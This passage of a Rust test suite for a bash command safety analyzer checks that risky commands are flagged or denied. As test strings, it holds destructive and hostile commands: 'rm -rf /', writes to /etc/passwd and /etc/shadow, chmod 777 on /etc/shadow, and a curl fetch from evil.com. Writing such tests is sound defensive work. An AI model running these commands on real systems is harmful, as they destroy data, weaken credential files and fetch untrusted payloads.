        let analysis = analyze_command("echo {1..5}");
        assert!(analysis
            .warnings
            .iter()
            .any(|w| w.kind == BashWarningKind::BraceExpansion));
    }

    // ---- Analysis summary ----

    #[test]
    fn safe_command_summary() {
        let analysis = analyze_command("ls -la");
        assert_eq!(analysis.summary(), "safe");
    }

    #[test]
    fn dangerous_command_summary_contains_detail() {
        let analysis = analyze_command("eval 'hello'");
        assert!(analysis.summary().contains("EvalLikeBuiltin"));
    }

    // ---- Empty / edge cases ----

    #[test]
    fn empty_command_is_safe() {
        let analysis = analyze_command("");
        // Empty parses as empty program — safe
        assert!(!analysis.is_dangerous() || analysis.command_name.is_none());
    }

    #[test]
    fn control_characters_denied() {
        let analysis = analyze_command("echo \x01hello");
        assert_eq!(analysis.verdict, BashVerdict::Deny);
    }

    // ---- Phase 2: Redirect Analysis ----

    #[test]
    fn test_redirect_to_sensitive_path() {
        let analysis = analyze_command("echo hacked > /etc/passwd");
        assert_eq!(analysis.verdict, BashVerdict::Deny);
        assert!(analysis
            .warnings
            .iter()
            .any(|w| w.kind == BashWarningKind::RedirectToSensitivePath));
    }

    #[test]
    fn test_redirect_append_sensitive_path() {
        let analysis = analyze_command("echo data >> /etc/shadow");
        assert_eq!(analysis.verdict, BashVerdict::Deny);
        assert!(analysis
            .warnings
            .iter()
            .any(|w| w.kind == BashWarningKind::RedirectToSensitivePath));
    }

    #[test]
    fn test_redirect_safe_path() {
        let analysis = analyze_command("echo hello > /tmp/output.txt");
        assert_eq!(analysis.verdict, BashVerdict::Safe);
        assert!(!analysis
            .warnings
            .iter()
            .any(|w| w.kind == BashWarningKind::RedirectToSensitivePath));
    }

    // ---- Phase 2: Variable-as-Command ----

    #[test]
    fn test_variable_as_command() {
        let analysis = analyze_command("$cmd arg1 arg2");
        assert_eq!(analysis.verdict, BashVerdict::Deny);
        assert!(analysis
            .warnings
            .iter()
            .any(|w| w.kind == BashWarningKind::VariableAsCommand));
    }

    #[test]
    fn test_braced_variable_as_command() {
        let analysis = analyze_command("${cmd} arg1");
        assert_eq!(analysis.verdict, BashVerdict::Deny);
        assert!(analysis
            .warnings
            .iter()
            .any(|w| w.kind == BashWarningKind::VariableAsCommand));
    }

    // ---- Phase 2: Suspicious Arguments ----

    #[test]
    fn test_suspicious_python_eval() {
        let analysis = analyze_command("python -c 'import os; os.system(\"rm -rf /\")'");
        assert!(analysis
            .warnings
            .iter()
            .any(|w| w.kind == BashWarningKind::SuspiciousArguments));
        assert!(analysis.is_dangerous());
    }

    #[test]
    fn test_suspicious_python_dash_e() {
        let analysis = analyze_command("python -e 'print(1)'");
        assert!(analysis
            .warnings
            .iter()
            .any(|w| w.kind == BashWarningKind::SuspiciousArguments));
    }

    #[test]
    fn test_suspicious_shell_dash_c() {
        let analysis = analyze_command("sh -c 'rm -rf /'");
        assert!(analysis
            .warnings
            .iter()
            .any(|w| w.kind == BashWarningKind::SuspiciousArguments));
    }

    #[test]
    fn test_suspicious_find_exec() {
        let analysis = analyze_command("find / -exec rm {} \\;");
        assert!(analysis
            .warnings
            .iter()
            .any(|w| w.kind == BashWarningKind::SuspiciousArguments));
    }

    // ---- Phase 2: Network Commands ----

    #[test]
    fn test_network_command_curl() {
        let analysis = analyze_command("curl http://evil.com/payload");
        assert!(analysis
            .warnings
            .iter()
            .any(|w| w.kind == BashWarningKind::NetworkCommand));
        assert!(analysis.is_dangerous());
    }

    #[test]
    fn test_network_command_wget() {
        let analysis = analyze_command("wget http://example.com/file");
        assert!(analysis
            .warnings
            .iter()
            .any(|w| w.kind == BashWarningKind::NetworkCommand));
    }

    #[test]
    fn test_network_command_ssh() {
        let analysis = analyze_command("ssh user@host");
        assert!(analysis
            .warnings
            .iter()
            .any(|w| w.kind == BashWarningKind::NetworkCommand));
    }

    // ---- Phase 2: Privilege Escalation ----

    #[test]
    fn test_privilege_escalation_sudo() {
        let analysis = analyze_command("sudo rm -rf /");
        assert!(analysis
            .warnings
            .iter()
            .any(|w| w.kind == BashWarningKind::PrivilegeEscalation));
        assert!(analysis.is_dangerous());
    }

    #[test]
    fn test_privilege_escalation_su() {
        let analysis = analyze_command("su - root");
        assert!(analysis
            .warnings
            .iter()
            .any(|w| w.kind == BashWarningKind::PrivilegeEscalation));
    }

    #[test]
    fn test_privilege_escalation_doas() {
        let analysis = analyze_command("doas ls /root");
        assert!(analysis
            .warnings
            .iter()
            .any(|w| w.kind == BashWarningKind::PrivilegeEscalation));
    }

    // ---- Phase 2: Permission Modification ----

    #[test]
    fn test_permission_modification() {
        let analysis = analyze_command("chmod 777 /etc/shadow");
        assert!(analysis
            .warnings
            .iter()
            .any(|w| w.kind == BashWarningKind::PermissionModification));
        assert!(analysis.is_dangerous());
    }

    #[test]
    fn test_permission_modification_safe_path() {
        let analysis = analyze_command("chmod 755 /tmp/script.sh");
        // Safe path — no warning
        assert!(!analysis
            .warnings
            .iter()
            .any(|w| w.kind == BashWarningKind::PermissionModification));
    }

    #[test]
    fn test_chown_sensitive() {
        let analysis = analyze_command("chown root:root /etc/passwd");
        assert!(analysis
            .warnings
            .iter()
            .any(|w| w.kind == BashWarningKind::PermissionModification));
    }

    // ---- Phase 2: Timeout and Node Budget ----

    #[test]
    fn test_analysis_budget_not_exceeded() {
        let analysis = analyze_command("ls -la");
        assert_eq!(analysis.verdict, BashVerdict::Safe);
        assert!(analysis.analysis_time_ms < 100);
        assert!(analysis.node_count < 1000);
    }

    // ---- Phase 2: Heredoc Content Analysis ----

    #[test]
    fn test_heredoc_with_expansion() {
        let analysis = analyze_command("cat << EOF\n$(dangerous)\nEOF");
        assert!(analysis
            .warnings
            .iter()
            .any(|w| w.kind == BashWarningKind::HeredocExpansion));
        assert!(analysis.is_dangerous());
    }

    #[test]
    fn test_heredoc_with_variable_expansion() {
        let analysis = analyze_command("cat << EOF\n$HOME\nEOF");
        assert!(analysis
            .warnings
            .iter()
            .any(|w| w.kind == BashWarningKind::HeredocExpansion));
    }

    #[test]
    fn test_heredoc_without_expansion() {
        let analysis = analyze_command("cat << 'EOF'\nhello world\nEOF");
        // No expansion in quoted heredoc
        assert!(!analysis
            .warnings
            .iter()
            .any(|w| w.kind == BashWarningKind::HeredocExpansion));
    }
}
